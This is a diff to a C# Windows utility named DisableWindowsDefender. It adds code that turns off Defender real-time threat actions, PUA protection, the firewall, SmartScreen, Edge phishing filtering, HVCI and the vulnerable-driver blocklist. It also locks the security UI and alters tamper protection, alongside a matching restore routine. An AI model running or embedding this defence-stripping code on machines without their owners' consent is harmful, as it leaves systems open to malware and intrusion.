@@ -1,9 +1,11 @@
 ﻿using Microsoft.Win32;
 using System;
+using System.Data;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.ServiceProcess;
+using System.Windows.Forms;
 
 namespace DisableWindowsDefender
 {
@@ -162,20 +164,33 @@ namespace DisableWindowsDefender
                 RunPowerShellCommand("Set-MpPreference -ModerateThreatDefaultAction 6");
                 RunPowerShellCommand("Set-MpPreference -LowThreatDefaultAction 6");
                 RunPowerShellCommand("Set-MpPreference -SevereThreatDefaultAction 6");
-                RunPowerShellCommand("netsh advfirewall set allprofiles state off");
+
+                RunPowerShellCommand("Set-MpPreference -PUAProtection 0");
+                RunPowerShellCommand("Set-MpPreference -PUAProtection Disabled");
+
+                RunCmdCommand("netsh advfirewall set allprofiles state off");
 
                 CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile", "DisableNotifications", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile", "EnableFirewall", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PrivateProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PrivateProfile", "DisableNotifications", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PrivateProfile", "EnableFirewall", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "DisableNotifications", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "EnableFirewall", "0", RegistryValueKind.DWord);
 
+                CreateRegristyFolder(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\DomainProfile");
                 WriteRegristyKey(@Registry.LocalMachine,@"Software\Policies\Microsoft\WindowsFirewall\DomainProfile", "DisableNotifications", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\DomainProfile", "EnableFirewall", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\PrivateProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\PrivateProfile", "DisableNotifications", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\PrivateProfile", "EnableFirewall", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\PublicProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\PublicProfile", "DisableNotifications", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall\PublicProfile", "EnableFirewall", "0", RegistryValueKind.DWord);
 
@@ -189,6 +204,7 @@ namespace DisableWindowsDefender
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender", "ServiceKeepAlive", "0", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender", "AllowFastService", "0", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender", "AllowFastServiceStartup", "0", RegistryValueKind.DWord);
+                WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender", "PUAProtection", "0", RegistryValueKind.DWord);
 
                 CreateRegristyFolder(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\Features");
                 WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender\Features", "DeviceControlEnabled", "0", RegistryValueKind.DWord);
@@ -212,6 +228,13 @@ namespace DisableWindowsDefender
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\UX Configuration", "SuppressRebootNotification", "1", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\UX Configuration", "UILockdown", "1", RegistryValueKind.DWord);
 
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Device performance and health");
+                WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Device performance and health", "UILockdown", "1", RegistryValueKind.DWord);
+               
+                CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Family options");
+                WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Family options", "UILockdown", "1", RegistryValueKind.DWord);
+
                 CreateRegristyFolder(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\Reportin");
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\Reportin", "DisableEnhancedNotifications", "1", RegistryValueKind.DWord);
 
@@ -222,7 +245,28 @@ namespace DisableWindowsDefender
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\SpyNet", "SpynetReporting", "0", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"Software\Policies\Microsoft\Windows Defender\SpyNet", "SubmitSamplesConsent", "2", RegistryValueKind.DWord);
 
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\CI\Config");
+                WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\CI\Config", "EnabledV9", "0", RegistryValueKind.DWord);
+                WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\CI\Config", "VulnerableDriverBlocklistEnable", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity", "Enabled", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\WTDS\Components");
+                WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\WTDS\Components", "ServiceEnabled", "0", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter");
+                WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter", "EnabledV9", "0", RegistryValueKind.DWord);
+
+
+                CreateRegristyFolder(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\AppHost");
+                WriteRegristyKey(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\AppHost", "EnableWebContentEvaluation", "0", RegistryValueKind.DWord);
+                WriteRegristyKey(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\AppHost", "PreventOverride", "0", RegistryValueKind.DWord);
+
+
+                CreateRegristyFolder(Registry.CurrentUser, @"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge");
+                WriteRegristyKey(Registry.CurrentUser, @"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge", "EnabledV9", "0", RegistryValueKind.DWord);
+                WriteRegristyKey(Registry.CurrentUser, @"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge", "PreventOverride", "0", RegistryValueKind.DWord);
 
                 RunProcess(Path.Combine(Environment.SystemDirectory, @"schtasks.exe"), "/Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable");
                 RunProcess(Path.Combine(Environment.SystemDirectory, @"schtasks.exe"), "/Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable");
@@ -239,9 +283,13 @@ namespace DisableWindowsDefender
                     string DefenderScansPath = Path.Combine(DefenderPath, @"Scans");
 
                     string EngineDatabase = Path.Combine(DefenderScansPath, "mpenginedb.db");
+
                     if (File.Exists(EngineDatabase))
                     {
-                        File.Delete(EngineDatabase);
+                        try
+                        {
+                            File.Delete(EngineDatabase);
+                        } catch { }
                     }
 
                     string ProtectionHystoryPath = Path.Combine(DefenderScansPath, @"History");
@@ -277,9 +325,12 @@ namespace DisableWindowsDefender
                 RunPowerShellCommand("Set-MpPreference -SubmitSamplesConsent 1");
                 RunPowerShellCommand("Set-MpPreference -MAPSReporting 2");
 
+                RunPowerShellCommand("Set-MpPreference -PUAProtection 1");
+                RunPowerShellCommand("Set-MpPreference -PUAProtection Enabled");
+
                 try
                 {
-                    GetPermissionsOnRegristyKey(@"MACHINE\SOFTWARE\Microsoft\Windows Defender\Features");
+                    GetPermissionsOnRegristyKey(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features");
                     WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "5", RegistryValueKind.DWord);
                 }
                 catch { }
@@ -287,13 +338,20 @@ namespace DisableWindowsDefender
                 CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile", "DisableNotifications", "0", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile", "EnableFirewall", "1", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PrivateProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PrivateProfile", "DisableNotifications", "0", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PrivateProfile", "EnableFirewall", "1", RegistryValueKind.DWord);
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "DisableNotifications", "0", RegistryValueKind.DWord);
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile", "EnableFirewall", "1", RegistryValueKind.DWord);
 
                 DeleteRegristyFolderTree(Registry.LocalMachine, @"Software\Policies\Microsoft\WindowsFirewall");
                 RunPowerShellCommand("netsh advfirewall set allprofiles state on");
+
+                DeleteRegristyFolderTree(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows Defender Security Center");
+                DeleteRegristyFolderTree(Registry.CurrentUser, @"SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\CurrentVersion\AppContainer\Storage\microsoft.microsoftedge_8wekyb3d8bbwe\MicrosoftEdge");
 
                 RunProcess(Path.Combine(Environment.SystemDirectory, @"schtasks.exe"), "/Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Enable");
                 RunProcess(Path.Combine(Environment.SystemDirectory, @"schtasks.exe"), "/Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Enable");
@@ -301,7 +359,23 @@ namespace DisableWindowsDefender
                 RunProcess(Path.Combine(Environment.SystemDirectory, @"schtasks.exe"), "/Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Enable");
                 RunProcess(Path.Combine(Environment.SystemDirectory, @"schtasks.exe"), "/Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Enable");
 
+
+                DeleteRegristyFolderTree(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter");
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\CI\Config");
+                WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\CI\Config", "VulnerableDriverBlocklistEnable", "1", RegistryValueKind.DWord);
+
+
+                DeleteRegristyFolderTree(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\WTDS");
+                /*CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\WTDS\Components");
+                WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\WTDS\Components", "ServiceEnabled", "1", RegistryValueKind.DWord);*/
+
+                CreateRegristyFolder(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity");
                 WriteRegristyKey(Registry.LocalMachine, @"SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity", "Enabled", "1", RegistryValueKind.DWord);
+
+
+                DeleteRegristyKey(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\AppHost", "EnableWebContentEvaluation");
+                DeleteRegristyKey(Registry.LocalMachine, @"Software\Microsoft\Windows\CurrentVersion\AppHost", "PreventOverride");
 
                 RunProcess(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + @"\Windows Defender\MpCmdRun.exe", "-SignatureUpdate");
 
@@ -312,14 +386,11 @@ namespace DisableWindowsDefender
 
             public static void CloseDefenderSettings()
             {
-                foreach (Process Proc in Process.GetProcesses())
+                foreach (Process Proc in Process.GetProcessesByName("SecHealthUI"))
                 {
                     try
                     {
-                        if (Proc.ProcessName == "SecHealthUI")
-                        {
-                            Proc.Kill();
-                        }
+                        Proc.Kill();
                     }
                     catch { }
                 }
@@ -363,9 +434,21 @@ namespace DisableWindowsDefender
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("Error writing on " + Hive + "\\" + Key + "\n" + ex.ToString());
+                    Console.WriteLine("Error writing on " + Hive + "\\" + Key + " \"" + Name + "\"\n" + ex.ToString());
                 }
             }
+            public static void DeleteRegristyKey(RegistryKey Hive, string Key, string Name)
+            {
+                try
+                {
+                    Hive.OpenSubKey(Key, true).DeleteValue(Name);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine("Error deleting on " + Hive + "\\" + Key + " \"" + Name + "\"\n" + ex.ToString());
+                }
+            }
+
 
             private static void CreateRegristyFolder(RegistryKey Hive, string Key)
             {
@@ -658,14 +741,20 @@ namespace DisableWindowsDefender
             {
                 public static void EnableSmartScreen()
                 {
+                    CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
                     WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled", "On", RegistryValueKind.String);
+
                     DeleteRegristyFolderTree(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\System");
                 }
 
                 public static void DisableSmartScreen()
                 {
+                    CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer");
                     WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer", "SmartScreenEnabled", "Off", RegistryValueKind.String);
-                    WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\System", "EnableSmartScreen", "0", RegistryValueKind.DWord);
+
+                    CreateRegristyFolder(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\System");
+                    WriteRegristyKey(Registry.LocalMachine, @"SOFTWARE\Policies\Microsoft\Windows\System", "EnableSmartScreen", 0, RegistryValueKind.DWord);
+
                 }
             }
 
